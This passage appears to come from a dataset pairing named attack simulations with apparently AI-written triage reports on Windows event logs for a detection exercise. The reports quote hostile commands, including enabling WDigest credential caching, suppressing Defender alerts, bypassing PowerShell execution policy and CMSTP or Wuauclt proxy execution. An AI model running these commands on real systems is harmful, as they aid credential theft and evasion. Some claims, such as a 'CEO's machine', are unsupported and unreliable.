2. **Unusual Command Execution**: In the Sysmon log, there is a suspicious command executed by `cmd.exe` modifying the registry with the command line:
   ```
   ""cmd.exe"" /c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
   ```
   This command is used to enable WDigest credential caching, which can allow an attacker to retrieve plaintext passwords. This is a strong indication of malicious activity as this setting is often exploited to facilitate credential theft.

3. **Wevtutil Executed by Admin User**: The Sysmon log shows multiple executions of `wevtutil.exe`, a command-line utility used to manage Windows Event Log configurations, under the account `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate tool, its use may indicate attempts to clear or modify event logs to cover tracks.

4. **PowerShell and CMD Activity**: While there are no explicit PowerShell logs indicating further suspicious activity, the frequent use of `cmd.exe` might suggest scripting or batch activities worth investigating further.

5. **Software Update Activities**: The logs show multiple executions related to `MicrosoftEdgeUpdate.exe`, primarily under the `NT AUTHORITY\SYSTEM`. These appear to be legitimate update activities and do not exhibit direct malicious patterns.

### Assessment:

The presence of the command modifying the registry to enable WDigest credential caching is a critical red flag suggesting malicious intent, primarily aimed at credential theft. This aligns with known tactics used in advanced persistent threats or lateral movement within a network.

### Resolution:

- **MALICIOUS**: The registry modification suggests an active attempt to enable credential theft capabilities, a clear sign of malicious activity.

### Guidance:

1. **Immediate Actions**:
   - Isolate the affected machine to prevent further potential spread or data exfiltration.
   - Begin an incident response investigation to understand the full scope of the breach.
   - Examine recent account activities, especially for the `admin_test` user, to identify any further unauthorized access or anomalies.

2. **Remediation**:
   - Revert the registry changes to disable WDigest credential caching.
   - Change passwords for sensitive accounts potentially affected, prioritize high-privilege accounts.
   - Conduct a thorough audit of the machine and wider network for other indicators of compromise (IoCs).

3. **Preventive Measures**:
   - Strengthen monitoring and alerting for suspicious registry and command-line activities.
   - Educate users, especially those with elevated privileges, on recognizing and reporting suspicious behavior.
   - Ensure all systems are updated and patched to mitigate vulnerabilities exploited by attackers."
Disable Windows Change Password Feature,"**Detailed Analysis**

Upon reviewing the provided logs, several entries indicate a sequence of operations executed on the system around the same timeframe. Notably, the entries detail the execution of various standard Windows utilities, with particular attention to process and registry changes.

1. **Whoami and Hostname Executions:**
   - The execution of `whoami.exe` and `hostname.exe` (`EventID: 1`) occurs, with `whoami.exe` documenting the currently logged-in user, `SERVER002\admin_test`, and the host name, respectively. These commands are harmless on their own but could indicate privilege verification or reconnaissance if followed by suspicious activity.

2. **Registry Modification via Cmd and Reg.exe:**
   - A particularly concerning entry (`EventID: 1`) shows `cmd.exe` executing a command to modify the Windows registry (as demonstrated by `reg.exe`) to add a policy to disable password change functionality. This behavior is anomalous, often associated with malicious activity aiming to maintain persistence or hinder system security measures.

3. **Edge Update Executions:**
   - Multiple executions and activities related to `MicrosoftEdgeUpdate.exe` seem consistent with standard update operations for Edge, identified by their legitimate paths and signed by Microsoft Corporation. The frequent service stops and starts correlate with update or modification activities, which are routine for this application.

4. **Time Synchronization:**
   - Events related to `svchost.exe` managing time synchronization (`EventID: 4616`) highlight the resetting of time variables which can be associated with legitimate network time synchronization services. However, anomalies here might be suspect if used to manipulate log timestamps during unauthorized access.

5. **Security Privileges:**
   - Reviewing the security log entries (`EventID: 4672` and `4624`), the user `admin_test` is granted a range of special privileges characteristic of administrative access, including potentially dangerous privileges like `SeDebugPrivilege`. While these are normal for an admin, any unexpected granting or abuse of such privileges can be concerning without having proper authorization checks.

**Assessment and Resolution**

Given the collective context of these logs:
- The registry modification to disable password change (`reg.exe`) under a high integrity level, combined with the administrative context under which it was performed, suggests actions aligned with potential malicious intent to restrict system protections.
- Independent executions of standard command-line utilities (`whoami`, `hostname`) are benign in isolation but could imply reconnaissance when associated with other actions like registry alteration.
- Microsoft Edge update activities are deemed benign due to alignment with application software updates and use of known Microsoft services without any direct indicators of tampering.

**Found Threats/Risks:**
- The log specifically indicating a registry change to disable password changes poses a significant risk as it could illustrate an attempt to impair system security policies by someone with administrative credentials potentially gained through illicit means.

**Guidance:**
- Immediate investigation should focus on the anomalous registry modification to confirm legitimacy or determine unauthorized access, particularly if the user `admin_test` did not perform this action.
- Conduct a review of other systems for similar patterns to assess if coordinated actions exist across the network.
- Enhance monitoring and alerting for registry changes and utilization of admin privileges.

**Final Resolution: MALICIOUS**  
The presence of the registry modification aiming to disable password policies, in conjunction with admin-level privileges, strongly indicates malicious activity. Immediate security response measures and further investigation are strongly advised."
Launches an executable using Rundll32 and pcwutl.dll,"Upon reviewing the provided log entries, a few points stand out for analysis:

### 1. **Time Change Events:**
In the System and Security logs, there are events related to the system time being changed. This is indicated by Event ID 4616 in the Security log and Event ID 24 in the System log. The time changes are handled by the process `svchost.exe`, which is a standard Windows system process but can be a method used by attackers to bypass event logs' timelines or for replay attacks.

### 2. **Process Execution Patterns:**
- **PowerShell Logs:** Unfortunately, the PowerShell logs were empty. PowerShell is often a tool used in post-exploitation scenarios, but without logs, we can't make any determinations about its usage here.
  
- **Sysmon Logs:** Multiple instances of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` were executed by the user `admin_test`. The frequent execution of `wevtutil.exe` (an event utility tool) in a short frame might suggest log-clearing attempts, which is suspicious. However, without further details, like whether it was used to export or clear logs, it's hard to conclude if this behavior is indeed malicious.

- **Application Logs:** The entries mostly pertain to the Microsoft Edge Update service, which appears to run and stop as expected during updates.

### 3. **Privilege Escalation:**
Event ID 4672 in the Security log indicates that the user `admin_test` received special privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and others that are typically used for administrative tasks. While these privileges are not uncommon for an administrative account, they can be exploited if the account is compromised.

### 4. **Executable File Activity:**
Activities related to `MicrosoftEdgeUpdate` processes with multiple executions are seen primarily in Sysmon logs. The paths and activities align with auto-update behavior for software like browsers, which is generally benign unless it’s spoofed or manipulated.

### Final Assessment:
- The frequent changes of the system time are potentially suspicious, especially if there's no legitimate reason those should occur, as it might align with a tampering activity.
- Persistent use of system tools such as `wevtutil.exe` by `admin_test` suggests either legitimate admin activity or potentially log manipulation.
- No conclusive evidence of malware is found, but the behaviors do raise concerns about potential insider threats or misuse of administrative powers, especially given the user `admin_test` using high-privilege operations.

### Resolution:
Given the evidence, I would mark this situation as **SUSPICIOUS**. Further investigation is needed to confirm the intent behind the time change and the use of utilities like `wevtutil.exe`. It is advised to:
- Monitor the CEO's and `admin_test` user accounts for any future anomalous activity.
- Review and validate if recent administrative activities align with documented IT operations.
- Consider restricting privileged operations and verifying the integrity of the system logs."
Delete Microsoft Defender ASR Rules - InTune,"### Detailed Analysis:

#### Indicators of Malicious Activity:

1. **Time Manipulation:**
   - **Event ID 4616 (Security log):** There is a log entry indicating that time change events occurred on the system. In this case, it shows a rollback in system time from ""2024-10-28 10:18:07.2772041"" to ""2024-10-28 10:18:01.2581345."" This could be suspicious, as attackers sometimes manipulate system time to bypass time-based security measures or cover their tracks in logs.

2. **PowerShell Activity:**
   - **Events in PowerShell Log:** The execution of a PowerShell script to create, modify, and then delete a registry key that pertains to ""ASRRules"" in the Windows Defender Policy Manager is suspicious. Such registry modifications can indicate attempts to disable or alter security rules, which is a known technique for attackers trying to bypass security settings.
   - **Command Lines in Sysmon Log:** The command line executed by PowerShell involves potentially malicious registry manipulation, indicating this might not be benign administrative activity.

3. **Privilege Escalation:**
   - **Security Log - Event ID 4672:** The `admin_test` user has been granted a series of high-level privileges, which include dangerous permissions such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`. These privileges are commonly associated with potential privilege escalation activity. While not inherently malicious, their presence along with other indicators raise concern.

4. **Process Execution:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` by the `admin_test` user within a short timeframe could suggest suspicious activity, especially given their common use in data collection and remote console applications.

5. **System Process Execution:**
   - Instances where multiple EdgeUpdate processes and ids were triggered (`MicrosoftEdgeUpdate.exe`). While this could be legitimate update activity, it is necessary to verify its authenticity, given the other suspicious indicators.

6. **General Suspicion:**
   - The entirety of the behavior, particularly the combination of suspicious PowerShell use, privileges, and time manipulation, collectively suggests an attempt to compromise the system or its security measures.


### Assessment:

The logs contain several indicators of potentially malicious activity. The manipulation of system time, suspicious PowerShell activity modifying security-related registry keys, unusual frequency of certain process executions, and high-level privileges granted to a user form a pattern often associated with attempts to bypass security controls and maintain persistence in a compromised system.


### Resolution:

**MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Incident Response:**
   - Isolate the affected host from the network to prevent further potential impact and lateral movement by any attacker.

5. **Prevention:**
   - Strengthen endpoint security and monitoring through advanced threat protection tools.
   - Implement robust auditing, and logging policies, and regularly review logs for suspicious activities.

6. **User Awareness and Training:**
   - Conduct user awareness training to educate about spear-phishing and social engineering tactics often used to initiate such attacks.

7. **External Communication:**
   - If applicable, report the incident to relevant authorities and partners as per organizational policy and legal requirements."
Disable Windows Command Line Auditing using Powershell Cmdlet,"Upon reviewing the provided Windows event logs, I have identified several points of interest that could potentially indicate suspicious or malicious activity. Here's a detailed analysis:

1. **Time Change in Logs**:
   - In the Security and System logs, there are several entries with Event ID 4616 and Event ID 1, which indicate that the system time was changed. This is usually performed by authorized processes and is not inherently suspicious unless unauthorized changes are detected.

2. **Suspicious PowerShell Activity**:
   - In the Sysmon log and PowerShell log, there is a `powershell.exe` process (Event ID 1 in Sysmon and Event ID 600 in PowerShell) executing a command that changes the registry key `ProcessCreationIncludeCmdLine_Enabled` under `HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit`. The command is performed with elevated permissions (High Integrity Level), which is typically associated with administrative tasks. The execution and purpose of this command may indicate an attempt to obscure command-line arguments of processes for malicious intentions.

3. **Process Behavior**:
   - We observe `wevtutil.exe` and `conhost.exe` processes invoked multiple times by the user `SERVER002\admin_test`. While these actions can be legitimate if performed by an authorized admin user for viewing or modifying event logs, they might also indicate efforts to explore or alter event logs if no administrative task was scheduled or required.

4. **Microsoft Edge Update**:
   - Numerous entries indicate processes involving Microsoft Edge Update. This includes the execution of `MicrosoftEdgeUpdate.exe` and its components. These activities are generally benign, stemming from the routine update process of Microsoft Edge unless any execution path, parent process, or action looks inconsistent with usual update behaviors.

**Current Assessment**:
- The time change events themselves are not malicious but require verification to ensure they were authorized.
- The use of PowerShell to modify registry settings related to process command-line argument logging is suspicious, especially if there was no administrator-initiated task to justify this action.
- Multiple invocations of `wevtutil.exe` by an administrative account could be viewed as suspicious if there is no corresponding administrative reason for these actions.

**Resolution**: **SUSPICIOUS**

**Guidance**:
1. **Confirm Authorization**: Verify if the administrative user `admin_test` had authorized and justified reasons for executing PowerShell commands and the multiple invocations of `wevtutil.exe`.
2. **Registry Verification**: Investigate the registry changes made by PowerShell and verify if they are authorized or necessary. Revert unauthorized changes.
3. **Investigate User Activity**: Conduct an investigation into the actions performed by the `admin_test` user, checking for any anomalies or unauthorized tasks.
4. **Monitor and Audit**: Implement further monitoring of PowerShell usage and registry changes, ensuring logging and alerting for such sensitive changes.
5. **Process Analysis**: Review the other associated logs and system state to ensure no additional suspicious or malicious activities are present. 

Based on the aforementioned actions, determine if escalation is required for a more detailed forensic analysis."
Disable Remote Desktop Anti-Alias Setting Through Registry,"To effectively analyze this series of Sysmon logs, we need to identify any indicators of suspicious activity that could denote a compromised or at-risk system. We will focus on the execution of processes, patterns in command-line arguments, anomalies in user behavior, and potential misuse of system utilities. Let's go through the logs sequentially.

1. **Repeated Execution of System Utilities:**
   - The logs indicate the frequent execution of benign utilities such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe` under the user ""SERVER002\\admin_test"". These are standard Windows utilities, often used for diagnostics, but when executed iteratively, they can indicate exploration activity, possibly by an unauthorized user.

2. **Suspicious Registry Modification:**
   - The log entry with `cmd.exe` executing `reg.exe` to add a registry key (`HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services`) is notable. This specific registry operation appears to modify terminal services settings (`DisableRemoteDesktopAntiAlias`). Such modifications can be associated with a potential preparation for persistence or facilitating unauthorized remote access, which is highly suspicious.

3. **Elevation of Privilege or Admin Actions:**
   - Many processes are executed with ""High"" integrity level, suggesting administrative privileges are being utilized. While `wsmprovhost.exe` is a legitimate host process for PowerShell and administrative actions, its use as a parent process for several suspicious activities raises concerns about potential misuse.

4. **Command-Line Arguments:**
   - The command line used for `wevtutil.exe` lacks explicit files or configurations to manipulate, which might indicate unsanctioned log management. Attackers often clear or query event logs to cover their tracks. However, exact parameters are not explicit in the logs.

5. **Presence of Temporary Executables:**
   - Execution of files from `C:\\Program Files (x86)\\Microsoft\\Temp\\EU5EC0.tmp\\MicrosoftEdgeUpdate.exe` is unusual and could potentially denote the execution of a third-party application or temporary file, which could be part of a larger install process or malware. While this isn't conclusively malicious, it warrants further scrutiny.

**Assessment and Conclusion:**
Based on the current log entries, there are signs consistent with potentially unauthorized or suspicious behavior that merits additional investigation:
- The registry modification is direct evidence of an attempt to change system configurations potentially linked to security bypasses.
- Iterative use of system utilities without apparent purposeful outcomes.
- Execution of processes with high integrity, which may indicate privilege misuse or abuse.

**Resolution: SUSPICIOUS**
- Activities indicate potential preparation or execution of a planned unauthorized action. Immediate further investigation is required.
- Review access logs and authorization checks for user SERVER002\admin_test.
- Consider forensic analysis including memory dumps to check for resident threats.
- Evaluate the need to reset administrative credentials and strengthen monitoring for administrative actions."
Change Powershell Execution Policy to Bypass,"Based on the provided logs, the following analysis can be made:

### Analysis:

1. **Sysmon Log:**
   - **Usage of `wevtutil.exe` and `conhost.exe`:** We see repetitive execution of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility for managing event logs. However, its repetitive execution in a short span can be an indication of log tampering or attempts to export/clear logs, which is suspicious.
   - **PowerShell Execution:** Detected in the logs as:
     - `""CommandLine"":""\""powershell.exe\"" & {Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine}""`
     - This command often suggests an attempt to execute scripts without restrictions, which can be a tactic to circumvent security controls (such as execution policies) and potentially execute malicious PowerShell scripts. 
   - **Use of utilities like `whoami.exe` and `hostname.exe`:** These are legitimate utilities used for checking system information. Their standalone usage is usually benign; however, in conjunction with other suspicious activities, they could be used for reconnaissance by an attacker.

2. **Application Log:**
   - **Edge Update Events:** There are multiple occurrences related to Microsoft's Edge Update process. These processes look like normal update procedures and are executed by `NT AUTHORITY\SYSTEM`, consistent with system updates. However, the presence of multiple such processes warrants verification if there was a recent Edge update.

3. **System Log:**
   - **Time Service Activity:** Some system time adjustments are observed, which are not uncommon but should be factual against any potential impacts they may have on log integrity.

4. **Security Log:**
   - **Event ID 4616:** Indicates changes in the system time. While this can be routine, it aligns with the previous findings regarding time changes, and if it coincides with suspicious activities, it might be used to confuse logging activities.

5. **Windows PowerShell Log:**
   - **Execution Policy Bypass:** Confirms activity to set PowerShell's execution policy to bypass, as noted in the Sysmon logs. This is a significant red flag as it is commonly used to execute scripts that would otherwise be restricted due to security policies.

### Assessment:

The combination of frequent `wevtutil.exe` usage, PowerShell execution with bypassed execution policy, and potentially obfuscating the system time changes contributes to a suspicious pattern of activity. While each log entry alone (like `whoami` or `hostname`) might not be alarming, together they suggest an attempt to perform unauthorized actions potentially involving privilege escalation or covering tracks by interfering with the logs.

### Conclusion:

The activity documented in the logs points towards a potential security incident that requires further investigation. While there are benign processes, the context suggests actions that deviate from ordinary operations, specifically attempts to modify execution policies and possible log manipulation.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the suspected host from the network to prevent further potential damage.
   - Ensure that all logs are preserved for further forensic analysis.
   - Investigate whether there were any recent Microsoft Edge updates to clarify the presence of the numerous Edge Update events.

2. **Further Investigation:**
   - Conduct thorough threat hunting on the host for any unauthorized access.
   - Examine any PowerShell scripts that might have been executed.
   - Audit all privileged accounts that could have access to `SERVER002\admin_test` to ensure no unauthorized users are present.
   - Look for indicators of a persistent threat, such as unauthorized software installations or scheduled tasks.

3. **Security Improvement:**
   - Review and tighten PowerShell execution policies and monitor for changes.
   - Implement additional monitoring for critical processes and utilities like `wevtutil.exe` and PowerShell.
  
By pursuing these steps, the organization can address this suspicious activity while fortifying defenses against possible future attempts."
Create and start Hyper-V virtual machine,"### Analysis of Windows Event Logs:

Upon thorough investigation of the provided Windows event logs, several points of interest emerge that could potentially indicate suspicious or malicious activity:

#### Anomalous PowerShell Activity:
- In the **Windows PowerShell Log**, there is a series of PowerShell activity concerning the creation and manipulation of a virtual machine (`New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM`). Notably:
  - This script attempts to create and start a virtual machine with Secure Boot turned off, which can be considered potentially suspicious, especially if such activity isn't known or expected from legitimate user behavior. Virtual machine manipulation can sometimes be used to execute harmful activities within a sandbox environment to evade security monitoring on the actual machine.

#### System and Security Logs:
- The **System and Security Logs** appear largely consistent with typical Windows operations like time synchronization through svchost.exe, which interacts with `time.windows.com`. No direct anomalies were noted in timing, user IDs, or related operations that would raise suspicion of unauthorized access or privilege escalation in these logs.

#### Sysmon Logs:
- In the **Sysmon Logs**, repetitive executions and startup of processes related to Microsoft Edge Update are observed. These logs include:
  - **MicrosoftEdgeUpdateComRegisterShell64.exe** and **MicrosoftEdgeUpdate.exe**: These entries signify normal scheduled updates for Microsoft Edge, which on their own do not appear suspicious. The operations were executed by the `NT AUTHORITY\SYSTEM` user, indicating system-level tasks.
  - The PowerShell script mentioned earlier is executed by user `SERVER002\admin_test`. This user also repeatedly runs other standard utilities, such as `wevtutil.exe`, `conhost.exe`, and system utility tools such as `whoami.exe` and `hostname.exe`. The rapid succession and types of commands being run could point towards a user exploring system configurations or testing access and capabilities.

### Assessment:
- **BENIGN**: Most logs reflect standard operations you would expect in a managed Windows environment — updates, service sync, and periodic system information checks.
  
- **SUSPICIOUS**: The PowerShell activity around virtual machine management, particularly toggling Secure Boot off, warrants further examination. This script's particular execution should be reviewed in the context of this host's standard operational baseline. Also, further investigation into the user account `SERVER002\admin_test` and its activity history could be prudent to ensure it aligns with expected behavior.

### Resolution:
The combination of these findings leads to a resolution of **SUSPICIOUS** given the noted PowerShell activities that are non-standard and potentially indicative of an unauthorized test, evasion maneuver, or prelude to more malicious activities. Addressing this appropriately requires:
- Conducting an interview with the account owner of `SERVER002\admin_test` to confirm intended operations.
- Reviewing system and security policies regarding virtual machine creation and management on critical endpoints like the CEO's machine.
- Considering a detailed audit on PowerShell logging and monitoring for any subsequent anomalous operations.

This analysis flagged certain operations as needing closer inspection, but does not confirm malicious intent without further corroborating evidence."
CMSTP Executing Remote Scriptlet,"Upon analyzing the provided Windows event logs, the following points are noted which indicate suspicious activities:

1. **Usage of `cmd.exe` with `cmstp.exe`**:
   - The line `""CommandLine"":""\""cmd.exe\"" /c cmstp.exe /s \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.inf\""""`.
   - CMSTP (Connection Manager Profile Installer) can be used for bypassing User Account Control (UAC) and executing scripts with elevated privileges without triggering UAC prompts. This pattern of activity is commonly associated with malicious activity such as privilege escalation.

2. **Frequent Execution of `wevtutil.exe`**:
   - `wevtutil.exe` is used to clear Windows Event Logs, which is a behavior observed in attempts to cover up malicious actions or forensics traces.

3. **Multiple Executions of PowerShell and `wevtutil`**:
   - The execution of PowerShell with an administrative user (admin_test): `""Image"":""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""`.
   - It is frequent in systems subjected to unauthorized modifications or control, potentially running scripts without user's knowledge.

4. **Service Terminations**:
   - Events related to the stopping of `edgeupdate` services without correlating start events may point to interference aimed at disabling updates which could otherwise remedy vulnerabilities.

Overall, these activities caught in the logs are indicative of suspicious behavior that needs further investigation due to their potential linkages to tactics commonly employed by threat actors for privilege escalation and hiding activities on compromised systems.

### Assessment:
- **Potential Threat:** There are clear indicators of potentially malicious activity within the logs.
- **Risk:** There is an apparent risk of privilege escalation attacks, system alteration, or data exfiltration.

### Resolution:
- **SUSPICIOUS** - While there is no concrete evidence proving a malicious attack, the activities, especially around `cmstp.exe` usage and event log manipulations, necessitate further inquiry to rule out a possible compromise.

### Guidance:
1. **Immediate Investigation:**
   - Investigate the origin and legitimacy of the `cmstp.exe` command chain to confirm if it aligns with legitimate administrative tasks.
   - Verify if the Powershell and `wevtutil.exe` invocations were part of a scheduled task, system update, or unauthorized activity.

2. **Audit Logs:**
   - Perform a thorough review of other security logs and alerts around the specified timeframe for additional evidence of anomalous activities.

3. **User Activities:**
   - Cross-reference with user access and activity logs to verify if entries match typical user behavior patterns and authorized tasks.

4. **Further Monitoring:**
   - Increase system monitoring measures with heightened alert settings to capture any other suspicious signs.

Proceed with these steps to ensure system integrity and mitigate any undetected breaches or ongoing threats."
Suppress Win Defender Notifications,"**Detailed Analysis of Logs**

Upon analyzing the provided logs, there are several notable events that could indicate potentially suspicious or malicious activity. Below are the key observations:

1. **Time Change Events:**
   - Security Log entries with EventID 4616 denote a system time change. There are multiple instances in quick succession where system time was adjusted:
     - SubjectUserName: LOCAL SERVICE, ProcessName: C:\Windows\System32\svchost.exe
   - System Log also confirms these time changes with EventID 1. Time changes on servers without explicit administrative action might be accidental, a misconfiguration, or indicative of malicious attempts to hide or manipulate activity timestamps.

2. **High Privilege Logon and Privileges Granted:**
   - Security Log entries with EventID 4672 show user `admin_test` was assigned multiple high-level privileges such as SeDebugPrivilege and SeTakeOwnershipPrivilege. 
   - This event, combined with a Logon EventID 4624 (LogonType 3 - network), implies high privilege access was established remotely which could potentially signify lateral movement or unauthorized access.

3. **Process Execution of Command-line/Scripts:**
   - Sysmon log shows multiple execution of wevtutil.exe. Although a legitimate tool, repeated execution could indicate attempts to clear logs or manage event logs unethically.
   - The Sysmon entry for cmd.exe executing the command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f` indicates attempts to suppress notifications, potentially to hide malicious activity.

4. **Program Execution Context:**
   - There are entries showing typical operating system hosts (whoami.exe and hostname.exe) which might be used for reconnaissance in post-exploitation stages.
   - Command-line tool reg.exe was executed to modify registry settings, specifically Windows Defender configurations, indicating an attempt to disable or suppress security alerts.

5. **Edge Update Executions:**
   - The application log shows frequent and multiple executions related to Edge Update, likely benign in isolation. However, the sheer volume and coinciding timing with potential malicious activity suggests they should be reviewed in a broader context of investigating compromise.

**Assessment:**

- **High Privilege Activities:** The combination of network logon with elevated privileges and changes applied to system settings without verification can indicate prescriptive privilege escalation, a strategy used by attackers post-breach.
- **Suspicious Activity with System Tools:** The registry modifications and suppressing Windows Defender could indicate an attempt to persist maliciously or avoid detection.
- **Malicious Intent Indicators:** Time modification and potentially obfuscating logs using tools such as wevtutil can be used by attackers to hide footprints or manipulate log analysis.

**Guidance:**

1. **Immediate Investigation:** All activities by the user `admin_test` require immediate attention due to high privilege usage and system alteration attempts.
2. **Review for Persistence Mechanisms:** Inspect registry, scheduled tasks, and startup entries for potential persistence mechanisms.
3. **Network Traffic Analysis:** Analyze network traffic related to the net LogonType and consider isolating the machine for deep analysis.
4. **Elevated Privilege Tracking:** Follow through any tracks related to the escalation of privileges and any lateral network movements.
5. **Process Initiated Actions:** Review and cross-reference executed commands with enterprise security policies and implement detection mechanisms for unusual commands.

**Resolution:**

Based on the reviewed logs and potential intent for system manipulation and access control bypass, the overall assessment falls under **MALICIOUS**."
Masquerading - powershell.exe running as taskhostw.exe,"### Analysis of the Logs:

1. **PowerShell Logs:**
   - Multiple instances of `taskhostw.exe` running from an unusual directory (`C:\Users\admin_test\AppData\Roaming`) identified as hosting PowerShell sessions. This is highly suspicious since `taskhostw.exe` is a legitimate Windows process typically not associated with PowerShell.
   - The CommandLine argument for PowerShell executions is missing, which makes it difficult to ascertain direct malicious scripts, though the context of execution is anomalous.

2. **Sysmon Logs:**
   - There are instances where a `cmd.exe` is used to copy `powershell.exe` to `taskhostw.exe` in the `%APPDATA%` directory and then execute it, which is a known technique used by attackers to masquerade malicious scripts as legitimate Windows binaries.
   - High Integrity Level processes (such as `PowerShell` run from `%APPDATA%` locations) and impersonation activity indicate potential privilege abuse or escalation.
   - Execution of processes such as `whoami.exe`, `cmd.exe`, and `hostname.exe` might indicate an attacker enumerating user and system information, possibly as part of a reconnaissance phase.
   - The repeated launches of `wevtutil.exe` can suggest enumeration or manipulation of Windows Event Logs.

3. **System Logs:**
   - Continuous Microsoft Defender Antivirus updates suggest normal operation; however, the context in which these occur could indicate compensation for recent or ongoing malicious activity trying to avoid detection.

4. **Security Logs:**
   - Several security audit logs with EventID 4672 (Special privileges assigned to new logon) and logon audits with EventID 4624 suggest that higher privileges, possibly administrative, may have been granted during certain logon sessions.
   - The `admin_test` account appears with elevated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.), which implies it's a target for privilege escalation.
   - The frequent attempted access to `MicrosoftAccount` credentials with failure codes noticed can be a sign of credential harvesting attempts or related suspicious authentication activity.

### Assessment:
Based on the evidence from the event logs, there appears to be probable malicious activity taking place on the host machine. The combination of executing system commands, renaming and executing scripts via unconventional methods, and harvesting account credentials points towards a compromise.

### Resolution: MALICIOUS
This assessment strongly indicates that malicious actions have taken place on the system, likely involving unauthorized access and misuse of PowerShell for purposes that appear consistent with known attack vectors.

### Guidance on How to Proceed:
- **Isolate the System:** Immediately isolate the affected machine from the network to contain potential lateral movement by the attacker.
- **Forensic Analysis:** Conduct a full forensic examination of the system, focusing on file systems, network activity, and RAM dumps to understand the full extent of the compromise.
- **Account Monitoring:** Review and monitor any suspicious activity related to the `admin_test` user credentials and reset passwords where necessary.
- **Patch and Update:** Ensure that all systems are patched and up-to-date, particularly with reference to security updates.
- **Audit and Harden:** Check for unauthorized privileges and harden security around user permissions and logging mechanisms.
- **User Awareness:** Provide security awareness training to users to highlight the importance of not executing unknown software and being aware of phishing tactics. 

Further investigation and probing into identified malicious processes should be incorporated into the incident response workflow to mitigate the threat effectively and prevent recurrence."
Load Arbitrary DLL via Wuauclt (Windows Update Client),"### Detailed Analysis of Logs

#### Suspicious or Anomalous Behavior

1. **Process Execution:**
   - `cmd.exe` executed with command-line arguments to run `wuauclt.exe` with a DLL located in a temp directory: `""cmd.exe"" /c wuauclt.exe /UpdateDeploymentProvider ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll"" /RunHandlerComServer`. This is suspicious because running DLLs from temporary directories is a common method used by malware to execute code.

2. **Linked Process Activity:**
   - The `wuauclt.exe` process, which is typically used for Windows updates, was invoked with `/UpdateDeploymentProvider`, targeting a DLL in a temporary directory. This is highly indicative of an attempt to execute unauthorized code under the guise of legitimate processes.

3. **User Context:**
   - The actions are performed under the user `SERVER002\\admin_test`, an admin-equivalent account, raising concerns about unauthorized privilege usage.

#### Potential Indicators of Compromise

1. **`wuauclt.exe` Command Execution:**
   - The use of `wuauclt.exe` with custom DLL in the command line within a temporary folder suggests malicious intent, particularly targeting the Windows Update processes for unauthorized tasks.

2. **Process Hierarchy:**
   - The Sysmon logs show that the parent process for suspicious execution (`cmd.exe`) was `wsmprovhost.exe`, usually related to Windows Remote Management (WinRM), which might be exploited for persistence or lateral movement.

3. **DLL Execution Path:**
   - The presence of a DLL in the path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\calc.dll` is unusual and suggests malicious activity since it tries to execute a potentially malicious payload via a trusted process.

4. **Security and Logon Events:**
   - Although multiple logon events and privileged access logs are recorded, they align with expected system activities without additional suspicious indicators beyond typical system operations.

### Assessment

Based on the analysis, the logs strongly suggest an attempt at executing potentially malicious code by exploiting legitimate system processes. Specifically, the sequential execution of `cmd.exe`, `wuauclt.exe`, and a DLL from a temporary directory points towards suspicious activity.

### Threats and Risks Identified

- There is a risk of arbitrary code execution through DLL injection or side-loading via `wuauclt.exe`.
- Potential for elevated privileges and unauthorized command execution due to the use of high-integrity processes.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the affected machine from the network to prevent any lateral movement or further compromise.
   - Stop and disable suspicious processes, specifically focusing on `wuauclt.exe` if it appears to be running the suspicious DLLs.

2. **Investigation:**
   - Conduct a deeper forensic analysis to capture memory dumps and examine other traces of compromise.
   - Review changes in system configurations, especially involving scheduled tasks and services.
   - Check for persistence mechanisms that may involve WinRM or any unexpected new accounts or privileges.

3. **Remediation:**
   - Remove any malicious files, particularly the DLLs involved.
   - Update EDR and antivirus definitions and run a full system scan.
   - Revise firewall rules and network segmentation to prevent recurrence.

4. **Review and Strengthen Security Posture:**
   - Regularly update software to patch vulnerabilities.
   - Educate users about phishing and the risks of executing unknown files.
   - Monitor network traffic for unusual patterns post-remediation.

### Resolution

**Resolution: MALICIOUS -** The activity within the logs is consistent with known tactics used by attackers to execute unauthorized code using trusted system processes. This warrants further investigation and immediate isolation to safeguard against potential damage."
Invoke-ATHRemoteFXvGPUDisablementCommand base test,"### Detailed Analysis of the Logs

#### Security Log Analysis
- **Event ID 4798 and 4799**: These logs indicate a query for local group membership on the system, particularly targeting accounts such as ""Guest,"" ""Administrator,"" ""admin_test,"" and others. The querying process name is `CompatTelRunner.exe`, which is usually a telemetry tool responsible for telemetry and data collection in Windows.
  
- **Event ID 4624 and 4672**: These relate to a successful logon and the assignment of elevated privileges to a process. The `LogonType` of 5 indicates a service logon, which is typical for system and service accounts. The privileges list includes high-level privileges such as `SeDebugPrivilege`, which can be concerning if not expected.

#### Sysmon Log Analysis
- **Process Creation Events**: The logs detail several process creation events involving:
  - `powershell.exe`, which is often used for both administrative tasks and by attackers for malicious activities. The command includes execution of `Invoke-ATHRemoteFXvGPUDisablementCommand`, which is not a standard PowerShell command and warrants further investigation.
  - Usage of `conhost.exe` and `wevtutil.exe` processes which could support PowerShell scripts or utilities, especially if PowerShell activities are being logged or modified.

